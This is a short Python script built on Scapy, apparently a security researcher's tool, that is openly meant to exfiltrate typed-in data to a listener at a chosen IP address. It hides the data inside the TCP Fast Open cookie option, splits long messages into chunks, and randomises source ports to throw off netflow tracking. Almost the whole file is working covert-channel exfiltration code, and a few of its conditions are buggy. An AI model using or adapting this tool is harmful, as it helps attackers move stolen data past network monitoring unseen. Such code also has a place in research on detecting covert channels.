#!/usr/bin/python
from scapy.all import *
import random
'''
This is the CLIENT that will send data to the listener.
Refer to TCPfastcookie-listener.py to extract the data to
a file

Note: Tested this via Windows 10 and Python 3.8.x with Scapy
Using the Windows 10 stack between hosts does not seem to 
get dropped since TCP Option fast cookie open is not
experimental and best of all it is a variable value

===============================================================================================
This software provides no expressed warranty or liability for use and is licensed under GPLv2
Dennis Chow dchow[AT]xtecsystems.com
www.scissecurity.com
March 15, 2020
===============================================================================================
'''

while True:
    #get user input
    print("This program uses scapy to send a option to send via TCP fast cookie and will split the msg up")
    rawdata = str(input("Enter the data you want to exfil: "))

    ##start building the packet from input
    rawdstIP = str(input("Enter the destination IP: "))
    rawdport = int(input("Enter the TCP port number the listener is on: "))

    #given max tcp option header size you can get around 34 chars to fit per pkt
    datasize = len(rawdata) #returns as int
    print("Size of your message: " + str(datasize))
    #stole this from 
    #https://pythonexamples.org/python-split-string-into-specific-length-chunks/
    #https://stackoverflow.com/questions/13673060/split-string-into-strings-by-length

    #ephemeral port randomizer non-privileged to throw netflow tracking off between messages
    #you may want to add this into the for loop if you can extract the sessions w/o relying on tuple/flows
    randsrcport = int(random.randint(1024, 65535))

    #if datasize >= 32: #split into chunks of 10
    #apparently this function is only good until python 2.x due to int vs. float return
    #   n = 10
    #   chunksarray = [str[i:i+n] \
    #   for i in range(0, len(rawdata), n)]
    #   print(chunksarray)


    if datasize >= 32: #split into chunks of 10
        chunks, chunk_size = len(rawdata), len(rawdata)//10
        data_array = [rawdata [i:i+chunk_size] for i in range(0, chunks, chunk_size)]
        #print(data_array)
        print("Number of fragmented chunks of your msg: ")
        print(len(data_array))
        print(data_array)

        for i in data_array:            
            #sendpkt = IP(dst=rawdstIP)/TCP(sport=1025, dport=rawdport, options=[(34, i)])/"\x00"
            sendpkt = IP(dst=rawdstIP)/TCP(sport=randsrcport, dport=rawdport, options=[(34, i)])/"\x00"
            send(sendpkt)
            print("Sent message chunk: " + i)
                        
    elif datasize > 0 < 32:
        print("Sending your message w/o chunking...")
        #sendpkt = IP(dst=rawdstIP)/TCP(sport=1025, dport=rawdport, options=[(34, rawdata)])/"\x00"
        sendpkt = IP(dst=rawdstIP)/TCP(sport=randsrcport, dport=rawdport, options=[(34, rawdata)])/"\x00"
        send(sendpkt)
        print("Sent message chunk: " + rawdata)
    elif datasize <= 0:
        print("Nothing to send or your input is corrupt exiting...")
        exit()


print("Done! returning to send another msg")
print("Press Crtl+C to exit")

